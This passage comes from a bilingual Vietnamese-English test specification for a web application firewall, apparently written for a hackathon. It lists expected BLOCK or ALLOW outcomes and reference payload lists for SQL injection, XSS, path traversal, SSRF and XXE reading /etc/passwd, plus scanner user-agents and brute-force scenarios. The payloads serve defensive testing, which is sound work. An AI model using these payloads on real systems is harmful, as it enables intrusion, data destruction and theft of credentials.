  {"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{}}}}}}}}}}}}}}}}}}}}}
  ```
  _(Depth = 20+ trong example trên, generate depth 100 khi test thực tế)_
- **Expected:** `BLOCK`
- **Rule:** Body abuse – deeply nested JSON (JSON bomb)
- **Notes:** JSON parse depth attack. Generate programmatically: `json.dumps({"a": ...recursive...})`.

---

### TC-BODY-004 — Content-Type mismatch (JSON header + XML body)

- **Tier:** HIGH
- **Method:** POST
- **Path:** `/api/data`
- **Headers:**
  ```
  Content-Type: application/json
  User-Agent: Mozilla/5.0
  ```
- **Body:**
  ```xml
  <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><evil>&xxe;</evil></root>
  ```
- **Expected:** `BLOCK`
- **Rule:** Body abuse – content-type mismatch + XXE attempt
- **Notes:** JSON header nhưng XML body với XXE payload = double violation.

---

### TC-BODY-005 — Body chứa null bytes

- **Tier:** CATCHALL
- **Method:** POST
- **Path:** `/api/search`
- **Headers:**
  ```
  Content-Type: application/json
  ```
- **Body:**
  ```json
  {"query": "normal search\u0000<script>alert(1)</script>"}
  ```
- **Expected:** `BLOCK`
- **Rule:** Body abuse – null byte injection in JSON value
- **Notes:** Null byte dùng để bypass string comparison checks.

---

## Category 13: Outbound Response Filtering

### TC-OUT-001 — Response chứa stack trace bị blocked

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/api/trigger-error`
- **Headers:**
  ```
  User-Agent: Mozilla/5.0
  ```
- **Body:** _(none)_
- **Expected:** `BLOCK` (WAF filter response body)
- **Rule:** Outbound – stack trace in 5xx response body
- **Notes:** Backend trả 500 với body chứa `at com.example.Controller.method(Controller.java:42)`. WAF phải block/truncate.

---

### TC-OUT-002 — Response chứa internal IP address

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/api/server-info`
- **Headers:** _(none)_
- **Body:** _(none)_
- **Expected:** `BLOCK` (WAF redact response)
- **Rule:** Outbound – internal IP leak prevention
- **Notes:** Response body chứa `"server": "192.168.1.10:8080"` phải bị redact/block.

---

### TC-OUT-003 — Response chứa API key / token

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/api/config-debug`
- **Headers:** _(none)_
- **Body:** _(none)_
- **Expected:** `BLOCK`
- **Rule:** Outbound – API key / secret leak in response
- **Notes:** Response chứa `"api_key": "sk-..."` hoặc `"AWS_ACCESS_KEY": "AKIA..."` phải bị block.

---

### TC-OUT-004 — Response chứa PAN / card number

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/api/payment-history`
- **Headers:**
  ```
  Cookie: session=valid_session
  ```
- **Body:** _(none)_
- **Expected:** `BLOCK` hoặc field được MASK
- **Rule:** Outbound – PAN / card_number field masking
- **Notes:** `"card_number": "4111111111111111"` phải bị mask thành `"card_number": "****1111"`.

---

### TC-OUT-005 — X-Powered-By / Server header stripped từ response

- **Tier:** CATCHALL
- **Method:** GET
- **Path:** `/`
- **Headers:**
  ```
  User-Agent: Mozilla/5.0
  ```
- **Body:** _(none)_
- **Expected:** `ALLOW` (response pass nhưng headers bị strip)
- **Rule:** Outbound – fingerprint headers stripped (Server, X-Powered-By)
- **Notes:** Assert response KHÔNG có headers: `Server`, `X-Powered-By`, `X-AspNet-Version`, `X-Generator`.

---

## Category 14: Functional / Sanity Checks

### TC-FN-001 — Request hoàn toàn hợp lệ đến `/api/products`

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/api/products`
- **Headers:**
  ```
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
  Accept: application/json
  Accept-Language: en-US,en;q=0.9
  Accept-Encoding: gzip, deflate, br
  ```
- **Body:** _(none)_
- **Expected:** `ALLOW`
- **Rule:** Functional – clean legitimate request must pass
- **Notes:** **Critical false positive check.** p99 latency WAF overhead phải ≤ 5ms.

---

### TC-FN-002 — Static asset `/static/logo.png` được cache

- **Tier:** MEDIUM
- **Method:** GET
- **Path:** `/static/logo.png`
- **Headers:**
  ```
  User-Agent: Mozilla/5.0
  Accept: image/webp,image/png,*/*
  ```
- **Body:** _(none)_
- **Expected:** `ALLOW` (với cache hit sau request thứ 2)
- **Rule:** Caching – MEDIUM tier aggressively cached
- **Notes:** Request thứ 2 phải có `X-Cache: HIT` hoặc response time giảm đáng kể.

---

### TC-FN-003 — CRITICAL tier response KHÔNG bao giờ được cache

- **Tier:** CRITICAL
- **Method:** POST
- **Path:** `/login`
- **Headers:**
  ```
  Content-Type: application/json
  Cache-Control: max-age=3600
  ```
- **Body:**
  ```json
  {"username": "real_user", "password": "correct_password"}
  ```
- **Expected:** `ALLOW` (response không có cache headers)
- **Rule:** Caching – CRITICAL tier never cached
- **Notes:** Assert response headers: `Cache-Control: no-store, no-cache`, không có `X-Cache`.

---

### TC-FN-004 — Hot-reload rule mới không cần restart

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/api/test-new-rule`
- **Headers:**
  ```
  X-Custom-Attack-Header: trigger_new_custom_rule
  User-Agent: Mozilla/5.0
  ```
- **Body:** _(none)_
- **Expected:** `BLOCK` (sau khi add rule mới qua hot-reload)
- **Rule:** Hot-reload – new rule active without binary restart
- **Notes:** Add rule detect `X-Custom-Attack-Header`, send SIGHUP, rồi test. Không restart binary.

---

### TC-FN-005 — Whitelisted IP bypass tất cả detection rules

- **Tier:** CRITICAL
- **Method:** GET
- **Path:** `/admin`
- **Headers:**
  ```
  X-Real-IP: 10.10.1.50
  User-Agent: sqlmap/1.7
  ```
- **Body:** _(none)_
- **Expected:** `ALLOW`
- **Rule:** Whitelist – internal monitoring IP exempt from all rules
- **Notes:** Config whitelist `10.10.1.50` trước khi test. Ngay cả sqlmap UA cũng phải PASS nếu IP trong whitelist.

---

### TC-FN-006 — Tor exit node bị block tại CRITICAL tier

- **Tier:** CRITICAL
- **Method:** POST
- **Path:** `/login`
- **Headers:**
  ```
  Content-Type: application/json
  X-Real-IP: 185.220.101.1
  ```
- **Body:**
  ```json
  {"username": "user", "password": "pass"}
  ```
- **Expected:** `BLOCK`
- **Rule:** Blacklist – known Tor exit node IP
- **Notes:** `185.220.101.1` là Tor exit node thực. Cần load Tor exit list lúc startup.

---

### TC-FN-007 — Performance baseline: p99 latency overhead ≤ 5ms

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/api/products`
- **Headers:**
  ```
  User-Agent: Mozilla/5.0
  Accept: application/json
  ```
- **Body:** _(none)_
- **Expected:** `ALLOW` với p99 overhead ≤ 5ms
- **Rule:** Performance SLA – WAF latency overhead không vượt 5ms p99
- **Notes:** Dùng `wrk -t4 -c100 -d30s`. So sánh latency có WAF vs không có WAF. Delta p99 ≤ 5ms.

---

### TC-FN-008 — Throughput baseline: ≥ 5,000 req/s

- **Tier:** HIGH
- **Method:** GET
- **Path:** `/static/app.js`
- **Headers:**
  ```
  User-Agent: Mozilla/5.0
  ```
- **Body:** _(none)_
- **Expected:** `ALLOW` với throughput ≥ 5,000 req/s
- **Rule:** Performance SLA – minimum throughput 5,000 req/s
- **Notes:** `wrk -t8 -c200 -d60s http://WAF_HOST/static/app.js`. Assert requests/sec ≥ 5000.

---

## Phụ lục A: Danh sách Attack Payloads Tham Khảo

### SQLi Payloads

```
' OR '1'='1
' OR 1=1--
1 UNION SELECT null,username,password FROM users--
1; DROP TABLE users--
1; WAITFOR DELAY '0:0:5'--
1 AND SLEEP(5)--
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
admin'--
' OR 'x'='x
1) OR (1=1--
```

### XSS Payloads

```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
javascript:alert(1)
<iframe src=javascript:alert(1)>
"><script>alert(document.domain)</script>
'><script>alert(1)</script>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
{{7*7}}  (template injection sanity check)
```

### Path Traversal Payloads

```
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252fetc%252fpasswd
....//....//....//etc/passwd
..;/etc/passwd
/etc/passwd%00.jpg
..\..\..\windows\system32\drivers\etc\hosts
```

### SSRF Payloads

```
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://[::1]/
http://2130706433/         (127.0.0.1 decimal)
http://0x7f000001/         (127.0.0.1 hex)
http://192.168.0.1/
http://10.0.0.1/
http://172.16.0.1/
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/
```

### Scanner User-Agents

```
sqlmap/1.7.11#stable (https://sqlmap.org)
Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)
Nmap Scripting Engine
masscan/1.3
zgrab/0.x
nuclei/2.9.4
WPScan v3.8.24
Acunetix-Aspect/1.0
python-requests/2.31.0
Go-http-client/1.1  (khi kết hợp với attack patterns)
```

---

## Phụ lục B: Test Execution Flow cho Attack Battle Scenarios

### Scenario 1: Full Brute Force Attack

```
1. [IP_A] POST /login {"username":"admin","password":"pass1"} → expect 401 (pass-through)
2. [IP_A] POST /login {"username":"admin","password":"pass2"} → expect 401
3. [IP_A] POST /login x10 → expect 429/403 (rate limit)
4. [IP_B] POST /login {"username":"admin","password":"pass1"} → expect 401 (new IP, new attempt)
5. [IP_B] POST /login x5 → expect 429/403
6. Verify: dashboard shows brute force alert
```

### Scenario 2: Canary → Full Block

```
1. [IP_A] GET /admin-test → expect 403/404
2. Verify: IP_A risk score = MAX in dashboard
3. [IP_A] GET / → expect 403 (blocked due to canary)
4. [IP_A] GET /api/products → expect 403 (all requests blocked)
5. [IP_B] GET / → expect 200 (unaffected)
```

### Scenario 3: Transaction Fraud Sequence

```
1. POST /login → get session token (t=0)
2. POST /otp → verify OTP (t=2s) 
3. POST /deposit {"amount": 50000} at t=4s → expect BLOCK (too fast)
4. Wait 60s
5. POST /deposit {"amount": 50000} at t=64s → expect ALLOW (normal timing)
6. POST /withdrawal {"amount": 50000} at t=65s → expect BLOCK (immediate withdrawal)
```

### Scenario 4: OWASP Coverage Check

```
1. SQLi: GET /api/products?id=1' OR '1'='1 → expect BLOCK
2. XSS: GET /search?q=<script>alert(1)</script> → expect BLOCK
3. Path: GET /static/../../../etc/passwd → expect BLOCK
4. SSRF: POST /api/fetch {"url":"http://169.254.169.254/"} → expect BLOCK
5. Header: GET /?url=test%0d%0aSet-Cookie:hacked=1 → expect BLOCK
6. Verify: dashboard shows 5 different attack types detected
```

---

## Phụ lục C: Expected HTTP Status Codes

| Result | Expected Status Codes |
|--------|----------------------|
| BLOCK | 400, 403, 503 |
| RATE_LIMITED | 429 |
| CHALLENGE | 403 với body chứa JS challenge / PoW |
| ALLOW | 200, 201, 204, 301, 302, 304 |
| CIRCUIT_BREAKER | 503 (fast, < 1s) |
| CANARY_TRIGGERED | 403 hoặc 404 (honeypot response) |

---

## Phụ lục D: Headers cần Assert trong Response

### Phải có

```
X-Request-ID: <uuid>          # Để trace trong audit log
X-WAF-Action: block|allow|challenge
```

### Không được có (phải bị stripped bởi WAF)

```
Server: Apache/2.4.x
X-Powered-By: PHP/8.x
X-AspNet-Version: 4.x
X-Generator: WordPress
X-Debug: *
X-Internal-*: *
X-Drupal-Cache: *
X-Varnish: *
```

---

_Tài liệu này được tạo cho WAF Mini Hackathon 2026. Tổng: **67 test cases** + 4 attack scenarios + payloads reference._
